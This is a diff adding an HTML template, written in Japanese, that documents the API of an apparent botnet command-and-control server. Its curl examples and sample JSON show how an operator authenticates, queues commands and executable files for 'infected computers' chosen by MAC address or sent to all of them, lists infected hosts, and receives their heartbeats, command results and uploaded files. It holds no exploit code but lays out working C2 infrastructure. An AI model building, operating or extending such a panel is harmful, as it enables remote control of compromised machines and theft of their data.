@@ -1,0 +1,293 @@
+{% extends "base_sec.html" %}
+{% block content %}
+<div class="container mt-3" style="max-width: 1400px">
+<div class="row">
+    <div class="col-md-9 order-2 order-md-1">
+        <div class="card p-3 mb-3">
+            <h1>APIの仕様</h1>
+            <article  id="api_1" class="mt-4">
+                <h2>JWTの生成</h2>
+                <p>アカウント登録後、以下のURLへemail, passwordをPOSTします。</p>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/token/?format=json
+curl -X POST http://127.0.0.1:8000/api/token/?format=json -d "email=email" -d "password=password"</pre>
+                <p>
+                    正常であれば以下のデータが返ってきます。<br>
+                    アクセストークンの期限は10分,リフレッシュトークンの期限は1日となっています。
+                </p>
+                <ul>
+                    <li>email -- 登録したemailアドレス</li>
+                    <li>password -- 登録したパスワード</li>
+                </ul>
+                <pre class="prettyprint linenums">
+{
+    "refresh":"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
+    "access":"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+}</pre>
+            </article>
+            <article  id="api_2" class="mt-4">
+                <h2>アクセストークンの更新</h2>
+                <p>以下のURLへリフレッシュトークンをPOSTします。</p>
+                <ul>
+                    <li>refresh -- 生成したリフレッシュトークン</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/token/refresh?format=json
+curl -X POST http://127.0.0.1:8000/api/token/refresh/?format=json -d "refresh=RefreshToken"</pre>
+                <p>
+                    正常であれば更新されたアクセストークンが返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "access":"XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+}</pre>
+            </article>
+            <article id="api_3" class="mt-4">
+                <h2>コマンド登録</h2>
+                <p>
+                    以下のURLへsender, cmd, recipientを含めPOSTします。このときAuthorizationヘッダーにアクセストークンを含めること。<br>
+                    recipientには、1対1の場合は感染させたコンピュータのMACアドレス、感染させたコンピュータすべてに命令する場合はALLを付与します。<br>
+                    ファイルを含める場合は、name, contentを付与する。
+                </p>
+                <ul>
+                    <li>※sender -- ユーザID</li>
+                    <li>※cmd -- コマンド</li>
+                    <li>※recipient -- 感染させたコンピュータのMACアドレス、もしくはALL</li>
+                    <li>　name -- ファイルの名前（例）〇〇〇.jpg, 〇〇〇.exe, 〇〇〇.batなど</li>
+                    <li>　content -- バイナリファイルとして開きbase64エンコードした文字列</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/command/?format=json
+// コマンドの登録のみ
+curl -X POST http://127.0.0.1:8000/api/command/?format=json -d sender=sender -d cmd=cmd -d recipient=recipient -H "Authorization: JWT AccessToken"
+// コマンドとファイルを登録する場合
+curl -X POST http://127.0.0.1:8000/api/command/?format=json -d sender=sender -d cmd=cmd -d recipient=recipient -d name=name -d content=content -H "Authorization: JWT AccessToken"</pre>
+                <p>
+                    正常であれば登録された内容が返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "id": 2,
+    "upfile": null,
+    "downfile": null,
+    "sender": 2,
+    "cmd": "hoghoe",
+    "recipient": "00-FF-CE-89-86-5A",
+    "response": "",
+    "cmd_finished": "2020-11-19T16:00:30.708550+09:00",
+    "resp_finished": null
+}</pre>
+            </article>
+            <article id="api_4" class="mt-4">
+                <h2>操作側の情報取得</h2>
+                <p>
+                    senderをGETパラメータに付与し、操作側が使用する情報を取得します。このときAuthorizationヘッダーにアクセストークンを含めること。<br>
+                </p>
+                <ul>
+                    <li>sender -- ユーザID</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/command/sender_cmd/?sender=sender&format=json
+curl http://127.0.0.1:8000/api/command/sender_cmd/?sender=sender&format=json</pre>
+                <p>
+                    正常であればsenderに紐づく内容が返ってきます。
+                </p>
+<pre class="prettyprint linenums">
+{
+    "next": null,
+    "before": null,
+    "count": 1,
+    "total_pages": 1,
+    "current_page": 1,
+    "results": [
+        {
+            "id": 1,
+            "upfile": null,
+            "downfile": {
+                "name": "1.png",
+                "link": "http://127.0.0.1:8000/static/downloads/AcQvwe7s5B8k.png"
+            },
+            "sender": 1,
+            "cmd": "dsdf",
+            "recipient": "00-FF-CE-89-86-5B",
+            "response": "hogheoh",
+            "cmd_finished": "2020-11-19T13:36:02.366172+09:00",
+            "resp_finished": "2020-11-19T13:59:11.666235+09:00"
+        }
+    ],
+    "page_size": 5
+}</pre>
+            </article>
+            <article id="api_5" class="mt-4">
+                <h2>感染者リストの取得</h2>
+                <p>
+                    感染者リストを取得します。<br>
+                </p>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/recipient/&format=json
+curl http://127.0.0.1:8000/api/recipient/&format=json</pre>
+                <p>
+                    正常であれば情報が返ってきます。
+                </p>
+<pre class="prettyprint linenums">
+[
+    {
+        "id": 1,
+        "recipient": "00-FF-CE-89-86-5B",
+        "finished": "2020-11-19T16:15:29.646043+09:00"
+    },
+    {
+        "id": 2,
+        "recipient": "00-FF-CE-89-86-6B",
+        "finished": "2020-11-19T13:28:18.170479+09:00"
+    },
+    {
+        "id": 3,
+        "recipient": "00-FF-CE-89-86-7B",
+        "finished": "2020-11-19T13:29:24.005309+09:00"
+    }
+]</pre>
+            </article>
+            <article  id="api_6" class="mt-4">
+                <h2>感染者の登録</h2>
+                <p>
+                    以下のURLへresponseを含めPOSTします。
+                </p>
+                <ul>
+                    <li>※recipient -- 感染させたコンピュータのMACアドレス</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/recipient/?format=json -d recipient=recipient
+curl -X POST http://127.0.0.1:8000/api/recipient/?format=json -d recipient=recipient
+</pre>
+                <p>
+                    正常であれば登録された内容が返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "id": 7,
+    "recipient": "00-FF-CE-89-86-6E",
+    "finished": "2020-11-19T16:12:26.583585+09:00"
+}</pre>
+            </article>
+            <article  id="api_7" class="mt-4">
+                <h2>感染者の生存確認</h2>
+                <p>
+                    以下のURLへrecipientパラーメータを含めGETします。<br>
+                    DBのfinished（アクセス日時）が更新されます。
+                </p>
+                <ul>
+                    <li>※recipient -- 感染させたコンピュータのMACアドレス</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/recipient/survival/?recipient=recipient
+curl http://127.0.0.1:8000/api/recipient/survival/?recipient=recipient
+</pre>
+                <p>
+                    正常であればfinishedが更新された内容が返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "id": 6,
+    "recipient": "00-FF-CE-89-86-5D",
+    "finished": "2020-11-19T16:15:54.914279+09:00"
+}</pre>
+            </article>
+            <article  id="api_8" class="mt-4">
+                <h2>感染者側からのレスポンス登録</h2>
+                <p>
+                    以下のURLへresponseを含めPATCHします。<br>
+                    URL内のidは情報を取得した際に含まれるidの値です。<br>
+                    ファイルを返す場合は、name, contentを付与する。
+                </p>
+                <ul>
+                    <li>※response -- 実行結果など</li>
+                    <li>　name -- ファイルの名前（例）〇〇〇.jpg, 〇〇〇.exe, 〇〇〇.batなど</li>
+                    <li>　content -- バイナリファイルとして開きbase64エンコードした文字列</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/command/id/?format=json
+// レスポンスの登録のみ
+curl -X PUT http://127.0.0.1:8000/api/command/id/?format=json -d response=response
+// レスポンスとファイルを登録する場合
+curl -X PUT http://127.0.0.1:8000/api/command/id/?format=json -d response=response -d name=name -d content=content </pre>
+                <p>
+                    正常であれば更新された内容が返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "id": 1,
+    "upfile": null,
+    "downfile": {
+        "name": "1.png",
+        "link": "http://127.0.0.1:8000/static/downloads/H2xqBBtBUMzS.png"
+    },
+    "sender": 1,
+    "cmd": "dsdf",
+    "recipient": "00-FF-CE-89-86-5B",
+    "response": "asdfasfd",
+    "cmd_finished": "2020-11-19T13:36:02.366172+09:00",
+    "resp_finished": "2020-11-19T15:34:13.878500+09:00"
+}</pre>
+            </article>
+            <article  id="api_9" class="mt-4">
+                <h2>感染者側からの情報取得</h2>
+                <p>
+                    recipientをGETパラメータに付与し、感染者側が使用する情報を取得します。<br>
+                    このとき、recipientがALLの情報も含め取得します。
+                </p>
+                <ul>
+                    <li>recipient -- 感染させたコンピュータのMACアドレス、もしくはALL</li>
+                </ul>
+                <pre class="prettyprint linenums">
+http://127.0.0.1:8000/api/command/bot_cmd/?recipient=recipient&format=json
+curl http://127.0.0.1:8000/api/command/bot_cmd/?recipient=recipient&format=json</pre>
+                <p>
+                    正常であれば登録された内容が返ってきます。
+                </p>
+                <pre class="prettyprint linenums">
+{
+    "next": null,
+    "before": null,
+    "count": 1,
+    "total_pages": 1,
+    "current_page": 1,
+    "results": [
+        {
+            "id": 1,
+            "upfile": null,
+            "downfile": {
+                "name": "1.png",
+                "link": "http://127.0.0.1:8000/static/downloads/H2xqBBtBUMzS.png"
+            },
+            "sender": 1,
+            "cmd": "dsdf",
+            "recipient": "00-FF-CE-89-86-5B",
+            "response": "asdfasfd",
+            "cmd_finished": "2020-11-19T13:36:02.366172+09:00",
+            "resp_finished": "2020-11-19T15:34:13.878500+09:00"
+        }
+    ],
+    "page_size": 5
+}</pre>
+            </article>
+        </div>
+    </div>
+    <div class="col-md-3 order-1 order-md-2">
+        <div class="card mb-3 following">
+            <nav class="nav flex-column">
+                <a class="nav-link active" href="#api_1">JWTの生成</a>
+                <a class="nav-link active" href="#api_2">アクセストークンの更新</a>
+                <a class="nav-link active" href="#api_3">コマンド登録</a>
+                <a class="nav-link active" href="#api_4">操作側の情報取得</a>
+                <a class="nav-link active" href="#api_5">感染者リストの取得</a>
+                <a class="nav-link active" href="#api_6">感染者の登録</a>
+                <a class="nav-link active" href="#api_7">感染者の生存確認</a>
+                <a class="nav-link active" href="#api_8">感染者側からのレスポンス登録</a>
+                <a class="nav-link active" href="#api_9">感染者側からの情報取得</a>
+              </nav>
+        </div>
+    </div>
+</div>
+</div>
+{% endblock %}
